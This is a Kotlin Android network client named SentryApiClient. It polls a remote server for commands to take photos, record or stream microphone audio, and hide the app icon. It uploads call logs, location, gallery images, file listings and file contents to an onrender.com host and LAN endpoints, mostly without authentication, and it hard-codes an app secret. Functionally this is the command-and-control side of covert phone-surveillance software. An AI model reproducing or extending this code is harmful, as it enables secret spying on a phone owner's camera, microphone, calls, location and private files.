package com.example.sentry.network

import android.content.Context
import android.os.Build
import com.example.sentry.BuildConfig
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.permission.PermissionManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * SentryApiClient communicates with the Cloud Backend to register the device,
 * perform challenge-response authentication, and sync capabilities.
 */
class SentryApiClient(
    private val context: Context,
    private var baseUrl: String = BuildConfig.BASE_URL
) {
    private var sessionToken: String? = null
    private val candidateBaseUrls = listOf(
        BuildConfig.BASE_URL,
        "https://sentry-f502.onrender.com/api/v1",
        "http://192.168.1.108:4000/api/v1",
        "http://192.168.1.124:4000/api/v1",
        "http://127.0.0.1:4000/api/v1",
        "http://10.0.2.2:4000/api/v1"
    )

    suspend fun registerDevice(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val publicKeyPem = CryptoManager.getPublicKeyPem()
        val capabilities = PermissionManager.getDeviceCapabilities(context)
        val savedName = com.example.sentry.config.SentryDeviceConfig.getDeviceName(context)

        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", savedName)
            put("platform", "Android")
            put("osVersion", "Android ${Build.VERSION.RELEASE}")
            put("appVersion", "1.0.0")
            put("publicKey", publicKeyPem)
            put("capabilities", capabilities)
        }

        val result = post("/devices/register", body, authenticated = false)
        result.onSuccess { res ->
            val devObj = res.optJSONObject("device")
            val cloudName = devObj?.optString("deviceName", "")
            if (!cloudName.isNullOrBlank()) {
                com.example.sentry.config.SentryDeviceConfig.setDeviceName(context, cloudName)
            }
        }
        result
    }

    suspend fun syncCapabilities(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val capabilities = PermissionManager.getDeviceCapabilities(context)

        val body = JSONObject().apply {
            put("capabilities", capabilities)
        }

        put("/devices/$deviceId/capabilities", body)
    }

    suspend fun sendHeartbeat(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply { put("deviceId", deviceId) }
        post("/presence/heartbeat", body)
    }

    suspend fun submitNotification(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
        post("/devices/notifications", body, authenticated = false)
    }

    suspend fun pollCameraCommand(): Result<String?> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val res = request("GET", "/photos/command/$deviceId", null, authenticated = false)
        res.map { it.optString("command").takeIf { cmd -> cmd.isNotBlank() && cmd != "null" } }
    }

    suspend fun uploadPhoto(camera: String, base64: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("camera", camera)
            put("name", "SNAPSHOT_${camera.uppercase()}_${(1000..9999).random()}.jpg")
            put("base64", base64)
        }
        post("/photos/upload", body, authenticated = false)
    }

    suspend fun pollAudioCommand(): Result<Int?> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val res = request("GET", "/audio/command/$deviceId", null, authenticated = false)
        res.map {
            if (it.has("duration") && !it.isNull("duration")) it.getInt("duration") else null
        }
    }

    suspend fun pollLiveAudioCommand(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        request("GET", "/audio/live/command/$deviceId", null, authenticated = false)
    }

    suspend fun pollIconVisibilityCommand(): Result<Boolean?> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val res = request("GET", "/devices/$deviceId/icon-command", null, authenticated = false)
        res.map {
            val cmdObj = it.optJSONObject("command")
            if (cmdObj != null && cmdObj.has("hide")) {
                cmdObj.getBoolean("hide")
            } else null
        }
    }

    suspend fun uploadLiveAudioChunk(
        deviceId: String,
        base64: String?,
        decibels: Int,
        micStatus: String,
        sequence: Int
    ): Result<JSONObject> = withContext(Dispatchers.IO) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            if (base64 != null) put("base64", base64)
            put("decibels", decibels)
            put("micStatus", micStatus)
            put("sequence", sequence)
        }
        post("/audio/live/chunk", body, authenticated = false)
    }

    suspend fun uploadAudio(name: String, duration: String, size: String, base64: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("name", name)
            put("duration", duration)
            put("size", size)
            put("base64", base64)
        }
        post("/audio/upload", body, authenticated = false)
    }

    suspend fun syncBatteryTelemetry(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
        post("/battery/telemetry", body, authenticated = false)
    }

    suspend fun syncLocation(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
        post("/location/sync", body, authenticated = false)
    }

    suspend fun syncCallLogs(calls: org.json.JSONArray): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("calls", calls)
        }
        post("/calls/sync", body, authenticated = false)
    }

    suspend fun syncGalleryMedia(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
        post("/gallery/sync", body, authenticated = false)
    }

    suspend fun pollGalleryCommands(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        request("GET", "/gallery/command/$deviceId", null, authenticated = false)
    }

    suspend fun uploadFullGalleryImage(mediaId: String, base64: String, mimeType: String = "image/jpeg"): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("mediaId", mediaId)
            put("base64", base64)
            put("mimeType", mimeType)
        }
        post("/gallery/upload_full", body, authenticated = false)
    }

    suspend fun pollFileCommands(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        request("GET", "/files/command/$deviceId", null, authenticated = false)
    }

    suspend fun syncFiles(currentPath: String, filesArray: org.json.JSONArray, storageStats: JSONObject? = null): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("currentPath", currentPath)
            put("files", filesArray)
            if (storageStats != null) {
                put("storageStats", storageStats)
            }
        }
        post("/files/sync", body, authenticated = false)
    }

    suspend fun uploadFileContent(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
        post("/files/upload_content", body, authenticated = false)
    }

    private fun get(endpoint: String): Result<JSONObject> {
        return request("GET", endpoint, null, authenticated = true)
    }

    private fun post(endpoint: String, body: JSONObject, authenticated: Boolean = true): Result<JSONObject> {
        return request("POST", endpoint, body.toString(), authenticated)
    }

    private fun put(endpoint: String, body: JSONObject): Result<JSONObject> {
        return request("PUT", endpoint, body.toString(), authenticated = true)
    }

    private fun request(
        method: String,
        endpoint: String,
        body: String?,
        authenticated: Boolean
    ): Result<JSONObject> {
        val urlsToTry = if (endpoint.startsWith("http")) listOf(endpoint) else candidateBaseUrls.map { "$it$endpoint" }

        for (fullUrl in urlsToTry) {
            try {
                val conn = URL(fullUrl).openConnection() as HttpURLConnection
                conn.requestMethod = method
                conn.connectTimeout = 10000
                conn.readTimeout = 20000
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                conn.setRequestProperty("X-App-Secret", "SECURE_CLUSTER_V2_99A8F74B")

                if (authenticated && sessionToken != null) {
                    conn.setRequestProperty("Authorization", "Bearer $sessionToken")
                }

                if (body != null && (method == "POST" || method == "PUT" || method == "PATCH")) {
                    conn.doOutput = true
                    OutputStreamWriter(conn.outputStream, "UTF-8").use { it.write(body) }
                }

                val responseCode = conn.responseCode
                val stream = if (responseCode in 200..299) conn.inputStream else conn.errorStream
                val responseText = BufferedReader(InputStreamReader(stream, "UTF-8")).use { it.readText() }

                if (responseCode in 200..299) {
                    return Result.success(if (responseText.isNotBlank()) JSONObject(responseText) else JSONObject())
                }
            } catch (_: Exception) {
                // Try next candidate URL
            }
        }
        return Result.failure(Exception("Could not connect to backend server"))
    }
}
